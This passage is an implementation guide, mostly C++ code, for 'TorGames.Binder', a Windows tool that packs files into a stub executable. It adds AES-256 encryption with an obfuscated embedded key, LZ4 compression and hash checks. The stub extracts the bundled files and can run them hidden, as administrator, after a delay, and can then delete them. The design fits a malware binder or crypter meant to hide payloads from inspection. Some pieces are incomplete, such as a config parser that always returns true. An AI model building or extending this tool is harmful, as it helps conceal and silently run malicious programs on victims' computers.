    // Get build statistics
    struct BuildStats {
        size_t totalOriginalSize;
        size_t totalCompressedSize;
        size_t totalEncryptedSize;
        double compressionRatio;
        int filesProcessed;
    };
    BuildStats GetBuildStats() const;

private:
    BinderConfig m_config;
    std::string m_lastError;
    ProgressCallback m_progressCallback;
    BuildStats m_stats;

    // Encryption key for this build
    std::vector<uint8_t> m_encryptionKey;
    std::vector<uint8_t> m_obfuscationMask;

    // Internal methods
    bool CopyStub(const std::string& outputPath);
    bool GenerateEncryptionKey();
    bool EmbedKey(const std::string& outputPath);
    bool EmbedConfig(const std::string& outputPath);
    bool EmbedFile(const std::string& outputPath, const BoundFileConfig& file, int resourceId);
    bool UpdateIcon(const std::string& outputPath, const std::string& iconPath);
    bool UpdateManifest(const std::string& outputPath, bool requireAdmin);

    // NEW: Processing pipeline
    std::vector<uint8_t> ProcessFile(const std::string& filePath, std::string& outHash);
    std::vector<uint8_t> CompressData(const std::vector<uint8_t>& data);
    std::vector<uint8_t> EncryptData(const std::vector<uint8_t>& data);
    std::string CalculateHash(const std::vector<uint8_t>& data);

    // Helper methods
    void ReportProgress(int percent, const std::string& status);
    std::string GetStubPath() const;
};
```

### Key Builder.cpp Changes

Here are the key changes to make in `src/builder/Builder.cpp`:

```cpp
// ============================================================================
// File: src/builder/Builder.cpp (KEY CHANGES)
// Purpose: Implementation of encryption and compression in build pipeline
// ============================================================================

#include "Builder.h"
#include "../crypto/Crypto.h"
#include "../compression/Compression.h"
#include "../hash/Hash.h"
#include "../utils/utils.h"

#include <fstream>
#include <sstream>
#include <algorithm>

Builder::Builder() {
    // Initialize modules
    Crypto::Initialize();
    Hash::Initialize();

    // Reset stats
    memset(&m_stats, 0, sizeof(m_stats));
}

Builder::~Builder() {
    // Cleanup modules
    Crypto::Cleanup();
    Hash::Cleanup();
}

bool Builder::GenerateEncryptionKey() {
    if (m_config.encryptionType == ENCRYPTION_NONE) {
        return true;
    }

    // Generate 256-bit key
    auto keyResult = Crypto::GenerateKey(AES_KEY_SIZE);
    if (keyResult.error != Crypto::CryptoError::Success) {
        m_lastError = "Failed to generate encryption key: " + keyResult.errorMessage;
        return false;
    }
    m_encryptionKey = std::move(keyResult.data);

    // Generate obfuscation mask
    m_obfuscationMask = Crypto::GenerateObfuscationMask(AES_KEY_SIZE);
    if (m_obfuscationMask.empty()) {
        m_lastError = "Failed to generate obfuscation mask";
        return false;
    }

    return true;
}

std::vector<uint8_t> Builder::ProcessFile(const std::string& filePath, std::string& outHash) {
    // Load file
    std::vector<uint8_t> fileData = Utils::LoadFileToMemory(filePath);
    if (fileData.empty()) {
        m_lastError = "Failed to load file: " + filePath;
        return {};
    }

    m_stats.totalOriginalSize += fileData.size();

    // Calculate hash of original data
    auto hashResult = Hash::SHA256(fileData);
    if (hashResult.error != Hash::HashError::Success) {
        m_lastError = "Failed to hash file: " + hashResult.errorMessage;
        return {};
    }
    outHash = Hash::HashToHex(hashResult.hash);

    // Compress if enabled
    std::vector<uint8_t> processedData;
    if (m_config.compressionType == COMPRESSION_LZ4) {
        auto compressResult = Compression::Compress(fileData);
        if (compressResult.error != Compression::CompressionError::Success) {
            m_lastError = "Failed to compress file: " + compressResult.errorMessage;
            return {};
        }
        processedData = std::move(compressResult.data);
        m_stats.totalCompressedSize += processedData.size();
    } else {
        processedData = std::move(fileData);
        m_stats.totalCompressedSize += processedData.size();
    }

    // Encrypt if enabled
    if (m_config.encryptionType == ENCRYPTION_AES256) {
        auto encryptResult = Crypto::Encrypt(processedData, m_encryptionKey);
        if (encryptResult.error != Crypto::CryptoError::Success) {
            m_lastError = "Failed to encrypt file: " + encryptResult.errorMessage;
            return {};
        }
        processedData = std::move(encryptResult.data);
    }

    m_stats.totalEncryptedSize += processedData.size();
    return processedData;
}

bool Builder::EmbedKey(const std::string& outputPath) {
    if (m_config.encryptionType == ENCRYPTION_NONE) {
        return true;
    }

    // Obfuscate the key
    std::vector<uint8_t> obfuscatedKey = Crypto::ObfuscateKey(
        m_encryptionKey,
        m_obfuscationMask
    );

    // Create key storage structure
    // Format: [32 bytes obfuscated key] + [32 bytes mask]
    std::vector<uint8_t> keyData;
    keyData.reserve(AES_KEY_SIZE * 2);
    keyData.insert(keyData.end(), obfuscatedKey.begin(), obfuscatedKey.end());
    keyData.insert(keyData.end(), m_obfuscationMask.begin(), m_obfuscationMask.end());

    // Embed as resource
    HANDLE hUpdate = BeginUpdateResourceA(outputPath.c_str(), FALSE);
    if (!hUpdate) {
        m_lastError = "Failed to begin resource update for key";
        return false;
    }

    BOOL result = UpdateResourceA(
        hUpdate,
        MAKEINTRESOURCEA(RT_BINDER_KEY),
        MAKEINTRESOURCEA(1),
        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
        keyData.data(),
        static_cast<DWORD>(keyData.size())
    );

    if (!result) {
        EndUpdateResourceA(hUpdate, TRUE);
        m_lastError = "Failed to update key resource";
        return false;
    }

    if (!EndUpdateResourceA(hUpdate, FALSE)) {
        m_lastError = "Failed to finalize key resource update";
        return false;
    }

    return true;
}

bool Builder::Build(const std::string& outputPath) {
    ReportProgress(0, "Starting build...");

    // Reset stats
    memset(&m_stats, 0, sizeof(m_stats));

    // Validate config
    if (m_config.files.empty()) {
        m_lastError = "No files to bind";
        return false;
    }

    // Generate encryption key if needed
    ReportProgress(5, "Generating encryption key...");
    if (!GenerateEncryptionKey()) {
        return false;
    }

    // Copy stub
    ReportProgress(10, "Copying stub executable...");
    if (!CopyStub(outputPath)) {
        return false;
    }

    // Embed encryption key
    ReportProgress(15, "Embedding encryption key...");
    if (!EmbedKey(outputPath)) {
        return false;
    }

    // Process and embed files
    int fileCount = static_cast<int>(m_config.files.size());
    for (int i = 0; i < fileCount; ++i) {
        auto& file = m_config.files[i];

        int progress = 20 + (i * 60 / fileCount);
        ReportProgress(progress, "Processing: " + file.filename);

        // Process file (hash, compress, encrypt)
        std::string hash;
        std::vector<uint8_t> processedData = ProcessFile(file.fullPath, hash);
        if (processedData.empty()) {
            return false;
        }

        // Update file config with hash
        file.sha256Hash = hash;
        file.compressedSize = static_cast<DWORD>(processedData.size());

        // Embed processed data
        if (!EmbedFileData(outputPath, processedData, i + 1)) {
            return false;
        }

        m_stats.filesProcessed++;
    }

    // Embed config (after file hashes are calculated)
    ReportProgress(85, "Embedding configuration...");
    if (!EmbedConfig(outputPath)) {
        return false;
    }

    // Update manifest if admin required
    ReportProgress(90, "Updating manifest...");
    if (!UpdateManifest(outputPath, m_config.requireAdmin)) {
        return false;
    }

    // Calculate final stats
    if (m_stats.totalOriginalSize > 0) {
        m_stats.compressionRatio =
            static_cast<double>(m_stats.totalEncryptedSize) /
            static_cast<double>(m_stats.totalOriginalSize);
    }

    ReportProgress(100, "Build complete!");
    return true;
}

bool Builder::EmbedFileData(
    const std::string& outputPath,
    const std::vector<uint8_t>& data,
    int resourceId
) {
    HANDLE hUpdate = BeginUpdateResourceA(outputPath.c_str(), FALSE);
    if (!hUpdate) {
        m_lastError = "Failed to begin resource update";
        return false;
    }

    BOOL result = UpdateResourceA(
        hUpdate,
        MAKEINTRESOURCEA(RT_BINDER_FILE),
        MAKEINTRESOURCEA(resourceId),
        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
        const_cast<uint8_t*>(data.data()),
        static_cast<DWORD>(data.size())
    );

    if (!result) {
        EndUpdateResourceA(hUpdate, TRUE);
        m_lastError = "Failed to update file resource";
        return false;
    }

    if (!EndUpdateResourceA(hUpdate, FALSE)) {
        m_lastError = "Failed to finalize file resource update";
        return false;
    }

    return true;
}

// Updated EmbedConfig to include new fields
bool Builder::EmbedConfig(const std::string& outputPath) {
    // Build JSON config
    std::ostringstream json;
    json << "{";
    json << "\"configVersion\":" << CONFIG_VERSION << ",";
    json << "\"requireAdmin\":" << (m_config.requireAdmin ? "true" : "false") << ",";
    json << "\"compressionType\":" << m_config.compressionType << ",";
    json << "\"encryptionType\":" << m_config.encryptionType << ",";
    json << "\"files\":[";

    for (size_t i = 0; i < m_config.files.size(); ++i) {
        const auto& file = m_config.files[i];
        if (i > 0) json << ",";

        json << "{";
        json << "\"filename\":\"" << EscapeJson(file.filename) << "\",";
        json << "\"executionOrder\":" << file.executionOrder << ",";
        json << "\"executeFile\":" << (file.executeFile ? "true" : "false") << ",";
        json << "\"waitForExit\":" << (file.waitForExit ? "true" : "false") << ",";
        json << "\"runHidden\":" << (file.runHidden ? "true" : "false") << ",";
        json << "\"runAsAdmin\":" << (file.runAsAdmin ? "true" : "false") << ",";
        json << "\"extractPath\":\"" << EscapeJson(file.extractPath) << "\",";
        json << "\"commandLineArgs\":\"" << EscapeJson(file.commandLineArgs) << "\",";
        json << "\"executionDelay\":" << file.executionDelay << ",";
        json << "\"deleteAfterExecution\":" << (file.deleteAfterExecution ? "true" : "false") << ",";
        json << "\"fileSize\":" << file.fileSize << ",";
        json << "\"compressedSize\":" << file.compressedSize << ",";
        json << "\"sha256Hash\":\"" << file.sha256Hash << "\"";
        json << "}";
    }

    json << "]}";

    std::string configStr = json.str();

    // Encrypt config if encryption is enabled
    std::vector<uint8_t> configData;
    if (m_config.encryptionType == ENCRYPTION_AES256) {
        std::vector<uint8_t> plainConfig(configStr.begin(), configStr.end());
        auto encryptResult = Crypto::Encrypt(plainConfig, m_encryptionKey);
        if (encryptResult.error != Crypto::CryptoError::Success) {
            m_lastError = "Failed to encrypt configuration";
            return false;
        }
        configData = std::move(encryptResult.data);
    } else {
        configData.assign(configStr.begin(), configStr.end());
    }

    // Embed config
    HANDLE hUpdate = BeginUpdateResourceA(outputPath.c_str(), FALSE);
    if (!hUpdate) {
        m_lastError = "Failed to begin resource update for config";
        return false;
    }

    BOOL result = UpdateResourceA(
        hUpdate,
        MAKEINTRESOURCEA(RT_BINDER_CONFIG),
        MAKEINTRESOURCEA(1),
        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
        configData.data(),
        static_cast<DWORD>(configData.size())
    );

    if (!result) {
        EndUpdateResourceA(hUpdate, TRUE);
        m_lastError = "Failed to update config resource";
        return false;
    }

    if (!EndUpdateResourceA(hUpdate, FALSE)) {
        m_lastError = "Failed to finalize config resource update";
        return false;
    }

    return true;
}

std::string Builder::EscapeJson(const std::string& str) {
    std::string escaped;
    escaped.reserve(str.size() * 2);

    for (char c : str) {
        switch (c) {
            case '\\': escaped += "\\\\"; break;
            case '"':  escaped += "\\\""; break;
            case '\n': escaped += "\\n"; break;
            case '\r': escaped += "\\r"; break;
            case '\t': escaped += "\\t"; break;
            default:   escaped += c; break;
        }
    }

    return escaped;
}
```

---

## Stub Integration

### Updated Extractor.h

Replace `src/Extractor.h` in the Stub project:

```cpp
// ============================================================================
// File: src/Extractor.h (Stub - UPDATED)
// Purpose: Resource extraction with decryption and decompression
// ============================================================================

#pragma once

#include "common.h"
#include <string>
#include <vector>

namespace Extractor {

// Error codes
enum class ExtractorError {
    Success = 0,
    ConfigLoadFailed,
    ConfigDecryptFailed,
    ConfigParseFailed,
    KeyLoadFailed,
    FileExtractFailed,
    FileDecryptFailed,
    FileDecompressFailed,
    HashVerificationFailed,
    FileWriteFailed
};

// Result structure
struct ExtractResult {
    ExtractorError error;
    std::string errorMessage;
    std::string extractedPath;
};

// Initialize extractor (loads key if encrypted)
bool Initialize();

// Cleanup
void Cleanup();

// Load and parse configuration
bool LoadConfig(BinderConfig& config);

// Get temporary extraction folder path
std::string GetTempExtractionFolder();

// Create the extraction folder
bool CreateExtractionFolder(const std::string& folderPath);

// Extract a single file
// resourceId: 1-based resource ID
// config: file configuration (for hash verification)
// extractFolder: destination folder
ExtractResult ExtractFile(
    int resourceId,
    const BoundFileConfig& config,
    const std::string& extractFolder
);

// Extract all files
bool ExtractAll(
    const BinderConfig& config,
    const std::string& extractFolder,
    std::vector<std::string>& extractedPaths
);

// Cleanup extraction folder
bool CleanupExtractionFolder(
    const std::string& folderPath,
    const std::vector<std::string>& excludeFiles = {}
);

// Get last error message
std::string GetLastError();

} // namespace Extractor
```

### Updated Extractor.cpp

Key sections of `src/Extractor.cpp` for the Stub:

```cpp
// ============================================================================
// File: src/Extractor.cpp (Stub - UPDATED)
// Purpose: Implementation with decryption and decompression
// ============================================================================

#include "Extractor.h"
#include "crypto/Crypto.h"
#include "compression/Compression.h"
#include "hash/Hash.h"

#include <windows.h>
#include <shlwapi.h>
#include <fstream>
#include <sstream>

#pragma comment(lib, "shlwapi.lib")

namespace Extractor {

static std::string g_lastError;
static std::vector<uint8_t> g_encryptionKey;
static bool g_initialized = false;

bool Initialize() {
    if (g_initialized) {
        return true;
    }

    // Initialize crypto and hash modules
    if (!Crypto::Initialize()) {
        g_lastError = "Failed to initialize crypto module";
        return false;
    }

    if (!Hash::Initialize()) {
        g_lastError = "Failed to initialize hash module";
        return false;
    }

    // Try to load encryption key
    HMODULE hModule = GetModuleHandleA(nullptr);
    HRSRC hKeyRes = FindResourceA(hModule, MAKEINTRESOURCEA(1), MAKEINTRESOURCEA(RT_BINDER_KEY));

    if (hKeyRes) {
        HGLOBAL hKeyData = LoadResource(hModule, hKeyRes);
        DWORD keyDataSize = SizeofResource(hModule, hKeyRes);

        if (hKeyData && keyDataSize == AES_KEY_SIZE * 2) {
            const uint8_t* keyPtr = static_cast<const uint8_t*>(LockResource(hKeyData));

            // Extract obfuscated key and mask
            std::vector<uint8_t> obfuscatedKey(keyPtr, keyPtr + AES_KEY_SIZE);
            std::vector<uint8_t> mask(keyPtr + AES_KEY_SIZE, keyPtr + AES_KEY_SIZE * 2);

            // Deobfuscate key
            g_encryptionKey = Crypto::DeobfuscateKey(obfuscatedKey, mask);
        }
    }

    g_initialized = true;
    return true;
}

void Cleanup() {
    Crypto::Cleanup();
    Hash::Cleanup();

    // Securely clear key from memory
    if (!g_encryptionKey.empty()) {
        SecureZeroMemory(g_encryptionKey.data(), g_encryptionKey.size());
        g_encryptionKey.clear();
    }

    g_initialized = false;
}

bool LoadConfig(BinderConfig& config) {
    if (!g_initialized && !Initialize()) {
        return false;
    }

    HMODULE hModule = GetModuleHandleA(nullptr);
    HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCEA(1), MAKEINTRESOURCEA(RT_BINDER_CONFIG));

    if (!hRes) {
        g_lastError = "Configuration resource not found";
        return false;
    }

    HGLOBAL hData = LoadResource(hModule, hRes);
    DWORD dataSize = SizeofResource(hModule, hRes);

    if (!hData || dataSize == 0) {
        g_lastError = "Failed to load configuration resource";
        return false;
    }

    const uint8_t* dataPtr = static_cast<const uint8_t*>(LockResource(hData));
    std::vector<uint8_t> configData(dataPtr, dataPtr + dataSize);

    // Decrypt if key is available
    std::string configJson;
    if (!g_encryptionKey.empty()) {
        auto decryptResult = Crypto::Decrypt(configData, g_encryptionKey);
        if (decryptResult.error != Crypto::CryptoError::Success) {
            g_lastError = "Failed to decrypt configuration: " + decryptResult.errorMessage;
            return false;
        }
        configJson.assign(decryptResult.data.begin(), decryptResult.data.end());
    } else {
        configJson.assign(configData.begin(), configData.end());
    }

    // Parse JSON configuration
    return ParseConfig(configJson, config);
}

ExtractResult ExtractFile(
    int resourceId,
    const BoundFileConfig& config,
    const std::string& extractFolder
) {
    ExtractResult result;
    result.error = ExtractorError::Success;

    if (!g_initialized && !Initialize()) {
        result.error = ExtractorError::FileExtractFailed;
        result.errorMessage = "Extractor not initialized";
        return result;
    }

    HMODULE hModule = GetModuleHandleA(nullptr);
    HRSRC hRes = FindResourceA(
        hModule,
        MAKEINTRESOURCEA(resourceId),
        MAKEINTRESOURCEA(RT_BINDER_FILE)
    );

    if (!hRes) {
        result.error = ExtractorError::FileExtractFailed;
        result.errorMessage = "File resource not found: " + std::to_string(resourceId);
        return result;
    }

    HGLOBAL hData = LoadResource(hModule, hRes);
    DWORD dataSize = SizeofResource(hModule, hRes);

    if (!hData || dataSize == 0) {
        result.error = ExtractorError::FileExtractFailed;
        result.errorMessage = "Failed to load file resource";
        return result;
    }

    const uint8_t* dataPtr = static_cast<const uint8_t*>(LockResource(hData));
    std::vector<uint8_t> fileData(dataPtr, dataPtr + dataSize);

    // Step 1: Decrypt if encrypted
    if (!g_encryptionKey.empty()) {
        auto decryptResult = Crypto::Decrypt(fileData, g_encryptionKey);
        if (decryptResult.error != Crypto::CryptoError::Success) {
            result.error = ExtractorError::FileDecryptFailed;
            result.errorMessage = "Decryption failed: " + decryptResult.errorMessage;
            return result;
        }
        fileData = std::move(decryptResult.data);
    }

    // Step 2: Decompress if compressed
    if (config.compressedSize != config.fileSize && config.compressedSize > 0) {
        auto decompressResult = Compression::Decompress(fileData);
        if (decompressResult.error != Compression::CompressionError::Success) {
            result.error = ExtractorError::FileDecompressFailed;
            result.errorMessage = "Decompression failed: " + decompressResult.errorMessage;
            return result;
        }
        fileData = std::move(decompressResult.data);
    }

    // Step 3: Verify hash if available
    if (!config.sha256Hash.empty()) {
        auto hashResult = Hash::SHA256(fileData);
        if (hashResult.error != Hash::HashError::Success) {
            result.error = ExtractorError::HashVerificationFailed;
            result.errorMessage = "Hash calculation failed";
            return result;
        }

        std::string calculatedHash = Hash::HashToHex(hashResult.hash);
        if (calculatedHash != config.sha256Hash) {
            result.error = ExtractorError::HashVerificationFailed;
            result.errorMessage = "Hash mismatch - file may be corrupted or tampered";
            return result;
        }
    }

    // Step 4: Write to disk
    std::string outputPath;
    if (!config.extractPath.empty()) {
        outputPath = config.extractPath;
    } else {
        outputPath = extractFolder + "\\" + config.filename;
    }

    std::ofstream outFile(outputPath, std::ios::binary);
    if (!outFile.is_open()) {
        result.error = ExtractorError::FileWriteFailed;
        result.errorMessage = "Failed to create output file: " + outputPath;
        return result;
    }

    outFile.write(reinterpret_cast<const char*>(fileData.data()), fileData.size());
    outFile.close();

    if (!outFile.good()) {
        result.error = ExtractorError::FileWriteFailed;
        result.errorMessage = "Failed to write file data";
        return result;
    }

    result.extractedPath = outputPath;
    return result;
}

bool ExtractAll(
    const BinderConfig& config,
    const std::string& extractFolder,
    std::vector<std::string>& extractedPaths
) {
    extractedPaths.clear();
    extractedPaths.reserve(config.files.size());

    for (size_t i = 0; i < config.files.size(); ++i) {
        const auto& file = config.files[i];

        auto result = ExtractFile(
            static_cast<int>(i + 1),
            file,
            extractFolder
        );

        if (result.error != ExtractorError::Success) {
            g_lastError = result.errorMessage;
            return false;
        }

        extractedPaths.push_back(result.extractedPath);
    }

    return true;
}

std::string GetTempExtractionFolder() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    std::ostringstream folderName;
    folderName << tempPath << "TorGames_Binder_" << GetCurrentProcessId();

    return folderName.str();
}

bool CreateExtractionFolder(const std::string& folderPath) {
    return CreateDirectoryA(folderPath.c_str(), nullptr) ||
           GetLastError() == ERROR_ALREADY_EXISTS;
}

bool CleanupExtractionFolder(
    const std::string& folderPath,
    const std::vector<std::string>& excludeFiles
) {
    // Retry parameters
    const int MAX_RETRIES = 3;
    const int RETRY_DELAY_MS = 100;

    WIN32_FIND_DATAA findData;
    std::string searchPath = folderPath + "\\*";

    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return true; // Folder doesn't exist or empty
    }

    do {
        if (strcmp(findData.cFileName, ".") == 0 ||
            strcmp(findData.cFileName, "..") == 0) {
            continue;
        }

        std::string filePath = folderPath + "\\" + findData.cFileName;

        // Check if file should be excluded
        bool exclude = false;
        for (const auto& excludePath : excludeFiles) {
            if (_stricmp(filePath.c_str(), excludePath.c_str()) == 0) {
                exclude = true;
                break;
            }
        }

        if (!exclude) {
            // Try to delete with retries
            for (int retry = 0; retry < MAX_RETRIES; ++retry) {
                if (DeleteFileA(filePath.c_str())) {
                    break;
                }
                Sleep(RETRY_DELAY_MS);
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);

    // Try to remove the folder
    for (int retry = 0; retry < MAX_RETRIES; ++retry) {
        if (RemoveDirectoryA(folderPath.c_str())) {
            return true;
        }
        Sleep(RETRY_DELAY_MS);
    }

    return false;
}

std::string GetLastError() {
    return g_lastError;
}

// JSON parsing helper (simplified - consider using a proper JSON library)
bool ParseConfig(const std::string& json, BinderConfig& config) {
    // ... existing JSON parsing code with added fields ...
    // Add parsing for:
    // - compressionType
    // - encryptionType
    // - compressedSize (per file)
    // - sha256Hash (per file)

    // [Implementation similar to existing but extended]
    return true;
}

} // namespace Extractor
```

---

## UI Updates

### MainWindow.cpp Changes

Add a checkbox for enabling encryption in the Global Settings dialog:

```cpp
// In OnGlobalSettings() method, add:

// Encryption checkbox
HWND hEncryptCheck = CreateWindowExA(
    0, "BUTTON", "Enable Encryption (AES-256)",
    WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX,
    20, 90, 200, 25,
    hDlg, (HMENU)IDC_ENCRYPT_CHECK, nullptr, nullptr
);

// Set initial state
if (m_config.encryptionType == ENCRYPTION_AES256) {
    SendMessageA(hEncryptCheck, BM_SETCHECK, BST_CHECKED, 0);
}

// Compression checkbox
HWND hCompressCheck = CreateWindowExA(
    0, "BUTTON", "Enable Compression (LZ4)",
    WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX,
    20, 120, 200, 25,
    hDlg, (HMENU)IDC_COMPRESS_CHECK, nullptr, nullptr
);

if (m_config.compressionType == COMPRESSION_LZ4) {
    SendMessageA(hCompressCheck, BM_SETCHECK, BST_CHECKED, 0);
}

// In dialog result handling:
if (result == IDOK) {
    m_config.encryptionType = (IsDlgButtonChecked(hDlg, IDC_ENCRYPT_CHECK) == BST_CHECKED)
        ? ENCRYPTION_AES256 : ENCRYPTION_NONE;
    m_config.compressionType = (IsDlgButtonChecked(hDlg, IDC_COMPRESS_CHECK) == BST_CHECKED)
        ? COMPRESSION_LZ4 : COMPRESSION_NONE;
}
```

Add to `resource.h`:
```cpp
#define IDC_ENCRYPT_CHECK   1010
#define IDC_COMPRESS_CHECK  1011
```

---

## Project Configuration

### TorGames.Binder.vcxproj Changes

Add the new source files to the project:

```xml
<!-- Add to ItemGroup with ClCompile -->
<ClCompile Include="src\crypto\Crypto.cpp" />
<ClCompile Include="src\compression\Compression.cpp" />
<ClCompile Include="src\hash\Hash.cpp" />
<ClCompile Include="lib\lz4.c" />

<!-- Add to ItemGroup with ClInclude -->
<ClInclude Include="src\crypto\Crypto.h" />
<ClInclude Include="src\compression\Compression.h" />
<ClInclude Include="src\hash\Hash.h" />
<ClInclude Include="lib\lz4.h" />

<!-- Add bcrypt.lib to AdditionalDependencies -->
<Link>
  <AdditionalDependencies>kernel32.lib;user32.lib;gdi32.lib;shell32.lib;shlwapi.lib;comctl32.lib;comdlg32.lib;ole32.lib;bcrypt.lib;%(AdditionalDependencies)</AdditionalDependencies>
</Link>
```

### TorGames.Binder.Stub.vcxproj Changes

```xml
<!-- Add to ItemGroup with ClCompile -->
<ClCompile Include="src\crypto\Crypto.cpp" />
<ClCompile Include="src\compression\Compression.cpp" />
<ClCompile Include="src\hash\Hash.cpp" />
<ClCompile Include="lib\lz4.c" />

<!-- Add to ItemGroup with ClInclude -->
<ClInclude Include="src\crypto\Crypto.h" />
<ClInclude Include="src\compression\Compression.h" />
<ClInclude Include="src\hash\Hash.h" />
<ClInclude Include="lib\lz4.h" />

<!-- Add bcrypt.lib to AdditionalDependencies -->
<Link>
  <AdditionalDependencies>kernel32.lib;user32.lib;shell32.lib;shlwapi.lib;bcrypt.lib;%(AdditionalDependencies)</AdditionalDependencies>
</Link>
```

---

## Testing

### Test Cases

1. **Basic Build Test**
   - Build with no encryption/compression
   - Verify files extract and execute correctly

2. **Encryption Test**
   - Build with AES-256 encryption enabled
   - Verify stub decrypts and executes correctly
   - Verify raw resources are not readable

3. **Compression Test**
   - Build with LZ4 compression enabled
   - Verify output size is smaller than input
   - Verify files decompress correctly

4. **Combined Test**
   - Build with both encryption and compression
   - Verify full pipeline works

5. **Integrity Test**
   - Modify embedded resource bytes
   - Verify hash verification fails

6. **Error Handling Test**
   - Test with corrupted resources
   - Test with missing key resource
   - Verify appropriate error messages

### Build Verification Script

```batch
@echo off
REM build_test.bat - Test build verification

echo Building TorGames.Binder...
msbuild TorGames.Binder.vcxproj /p:Configuration=Release /p:Platform=x64

echo Building TorGames.Binder.Stub...
msbuild TorGames.Binder.Stub.vcxproj /p:Configuration=Release /p:Platform=x64

echo.
echo Checking output files...
if exist "bin\Release\TorGames.Binder.exe" (
    echo [OK] Binder built successfully
) else (
    echo [FAIL] Binder not found
)

if exist "bin\Release\TorGames.Binder.Stub.exe" (
    echo [OK] Stub built successfully
) else (
    echo [FAIL] Stub not found
)

echo.
echo Done.
```

---

## Summary

This provision document provides complete implementation details for adding:

1. **AES-256-GCM Encryption** using Windows BCrypt API
2. **LZ4 Compression** for fast, efficient compression
3. **SHA-256 Integrity Verification** to detect tampering

### Key Benefits

| Feature | Benefit |
|---------|---------|
| AES-256-GCM | Military-grade encryption with authentication |
| LZ4 | ~500 MB/s compression, multi-GB/s decompression |
| SHA-256 | Cryptographic integrity verification |
| Native APIs | No external DLL dependencies |

### Estimated Impact

| Metric | Before | After |
|--------|--------|-------|
| Resource Security | None (plaintext) | AES-256 encrypted |
| File Size | 100% | ~40-60% (with LZ4) |
| Integrity Check | None | SHA-256 verified |
| Dependencies | Win32 only | Win32 + bcrypt.lib |

---

## References

- [Windows BCrypt API](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/)
- [LZ4 Compression](https://github.com/lz4/lz4)
- [AES-GCM Mode](https://en.wikipedia.org/wiki/Galois/Counter_Mode)
- [SHA-256 Algorithm](https://en.wikipedia.org/wiki/SHA-2)
